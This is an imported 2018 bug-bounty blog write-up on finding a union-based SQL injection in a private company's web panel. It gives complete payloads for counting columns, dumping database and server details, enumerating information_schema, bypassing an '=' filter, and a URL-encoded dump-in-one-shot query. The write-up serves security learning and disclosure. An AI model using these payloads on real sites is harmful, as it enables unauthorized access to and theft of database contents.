---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-03-12_union-based-sql-injection-write-up-a-private-company-site_2.md
original_filename: 2018-03-12_union-based-sql-injection-write-up-a-private-company-site_2.md
title: Union Based Sql injection Write up ->A private Company Site
category: documents
detected_topics:
- sqli
- xss
- command-injection
- clickjacking
- mobile-security
tags:
- imported
- documents
- sqli
- xss
- command-injection
- clickjacking
- mobile-security
language: en
raw_sha256: 78e5c8056d594149cf9ab9e575d44f56cd8a8a87c084efdac7bdcc892178a9c1
text_sha256: 8c052923c21103c680dc94129e2053fde0dfea4c34c0f1757af5b6586795f7dd
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Union Based Sql injection Write up ->A private Company Site

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-03-12_union-based-sql-injection-write-up-a-private-company-site_2.md
- Source Type: markdown
- Detected Topics: sqli, xss, command-injection, clickjacking, mobile-security
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `78e5c8056d594149cf9ab9e575d44f56cd8a8a87c084efdac7bdcc892178a9c1`
- Text SHA256: `8c052923c21103c680dc94129e2053fde0dfea4c34c0f1757af5b6586795f7dd`


## Content

---
title: "Union Based Sql injection Write up ->A private Company Site"
url: "https://medium.com/@nuraalamdipu/union-based-sql-injection-write-up-a-private-company-site-273f89a49ed9"
authors: ["Nur A Alam Dipu (@Dipu1A)"]
bugs: ["SQL injection"]
publication_date: "2018-03-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5951
scraped_via: "browseros"
---

# Union Based Sql injection Write up ->A private Company Site

Union Based Sql injection Write up ->A private Company Site
Nur A Alam Dipu
Follow
4 min read
·
Mar 12, 2018

329

4

Hello everyone,

This is my first blogpost writeup and I am very excited to share this. Few days ago I’ve tested a private site, I used the site name like “site.com”.

The company provide services via ip address. I dont know about their full service details. I just check bugs my regular testing way in their userpanel.

While testing I found some issues, like clickjacking, open redirection, and xss also.

After reported multiple bugs via mail ask them about update process they said,

Then I asked them about bounty,
They said,

Press enter or click to view image in full size

I was disappointed to see their reply. I thought may be they consider the xss issues. But they don’t accept any bug for bounty without sql injection. :(

In this time they already fixed the issues. But that time I was in vacation and spent time without my pc. So I can’t check any sql injection that time. I was dissapointed but my mind was thinking there’s must be a point to do sqli.

After fews days I back my work and start finding all endpoints.

So, for finding any parameters I normally used auckentix. I dont like to use any tool, but sometimes it helps. I just start searching many parameters but no params is vulnerable. Finally I found a parameter that is vulnerable to “union based injection” i was happy but can’t find any vulnerable column. In this mean time I found a Another parameter like https://site.com/ress/xx-list/os-detail?os=xxxxxxxxx. This parameter is sqli vulnerable also.

Get Nur A Alam Dipu’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Then try my all sql injection learning tricks.

First I fix the query in a normal process. I try with “union based”
https://site.com/xxxxx/xxxx-list/os-detail?os=xxxxx'--+ (query fixed)
https://site.com/xxxxx/xxxx-list/os-detail?os=xxxxx' order by 1 — + (ok)
https://site.com/xxxxx/xxxx-list/os-detail?os=xxxxx' order by 15 — + (error)
https://site.com/xxxxx/xxxx-list/os-detail?os=xxxxx' order by 11 — + (ok)

there is 11 columns :) Previous endpoint had 14 columns but no vulnerable column.

https://site.com/xxxxx/xxxx-list/os-detail?os=xxxxx' +UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11)) — +

Got the vulnerable point. Vulnerable column was 2,3,4,8. Then I try to print DB,version, OS, port and all others in the front page. This is now easy task to do other parts.

https://site.com/xxxxx/xxxx-list/os-detail?os=-xxxxx' Union Select 1,Concat(0x3c666f6e7420636f6c6f723d7265642073697a653d343e,’Injected by dipu’,0x3c62723e,’ version : ‘,@@version,0x3c62723e,’ DB : ‘,database(),0x3c62723e,’User : ‘,user(),0x3c62723e,’OS : ‘,@@VERSION_COMPILE_OS,0x3c62723e,’SSL : ‘,@@HAVE_OPENSSL,0x3c62723e,’Port : ‘,@@PORT ),3,4,5,6,7,8,9,10,11 — +

Press enter or click to view image in full size

Then I try to print tables schema,

https://site.com/xxxxx/xxxx-list/os-detail?os=-xxxxx' Union Select 1,Concat(0x3c666f6e7420636f6c6f723d7265642073697a653d343e,’Injected by dipu’,0x3c62723e,’ version : ‘,@@version,0x3c62723e,’ DB : ‘,database(),0x3c62723e,’User : ‘,user(),0x3c62723e,’OS : ‘,@@VERSION_COMPILE_OS,0x3c62723e,’SSL : ‘,@@HAVE_OPENSSL,0x3c62723e,’Port : ‘,@@PORT ),(select Group_Concat(0x3c62723e,table_name) from information_schema.tables where table_schema),4,5,6,7,8,9,10,11 — +

Tables Schema printed.

https://site.com/xxxxx/xxxx-list/os-detail?os=-xxxxx' Union Select 1,Concat(0x3c666f6e7420636f6c6f723d7265642073697a653d343e,’Injected by dipu’,0x3c62723e,’ version : ‘,@@version,0x3c62723e,’ DB : ‘,database(),0x3c62723e,’User : ‘,user(),0x3c62723e,’OS : ‘,@@VERSION_COMPILE_OS,0x3c62723e,’SSL : ‘,@@HAVE_OPENSSL,0x3c62723e,’Port : ‘,@@PORT ),(select Group_Concat(0x3c62723e,table_name,0x3a3a,column_name) from information_schema.columns where table_schema=database()),4,5,6,7,8,9,10,11 — +

But I got a problem there to print full table via union select query.
(select Group_Concat(0x3c62723e,table_name,0x3a3a,column_name) from information_schema.columns where table_schema=database())

the problem was ‘=’. I remembered,there is a way to bypass this equal sing. Just a simple bypass “=” change to like
(select Group_Concat(0x3c62723e,table_name,0x3a3a,column_name) from information_schema.columns where table_schema like database())

Then Full table was printed.

Then do dios. But dios not work. zen,makman, sharik no dios worked. I just encoded the query and printed the whole table with columns. I was shocked to see the info. :D Just in one word I can say, everything was there.

Full query with dios,

https://site.com/xxxx/xxx-list/os-detail?os=-xxxxx' Union Select 1,Concat(0x3c666f6e7420636f6c6f723d7265642073697a653d323e,’Injected by dipu’,0x3c62723e,’ version : ‘,@@version,0x3c62723e,’ DB : ‘,database(),0x3c62723e,’User : ‘,user(),0x3c62723e,’OS : ‘,@@VERSION_COMPILE_OS,0x3c62723e,’SSL : ‘,@@HAVE_OPENSSL,0x3c62723e,’Port : ‘,@@PORT ),3,4,5,6,7,8,%28%53%65%6c%65%63%74%20%65%78%70%6f%72%74%5f%73%65%74%28%35%2c%40%3a%3d%30%2c%28%73%65%6c%65%63%74%20%63%6f%75%6e%74%28%2a%29%66%72%6f%6d%28%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%63%6f%6c%75%6d%6e%73%29%77%68%65%72%65%40%3a%3d%65%78%70%6f%72%74%5f%73%65%74%28%35%2c%65%78%70%6f%72%74%5f%73%65%74%28%35%2c%40%2c%74%61%62%6c%65%5f%6e%61%6d%65%2c%30%78%33%63%36%63%36%39%33%65%2c%32%29%2c%63%6f%6c%75%6d%6e%5f%6e%61%6d%65%2c%30%78%61%33%61%2c%32%29%29%2c%40%2c%32%29%29,10,11 — +

I have reported them and they give reply so quick, they trun off the site and said,

Normally I dont check any sqli in big sites, cause its hard to find. But this finding inspire me to do more like this. Its true if they dont ask about sqli I didn’t try. :3

Hope you Like my first write up.

Sorry for my mistakes and bad english.

Thanks for reading. :)
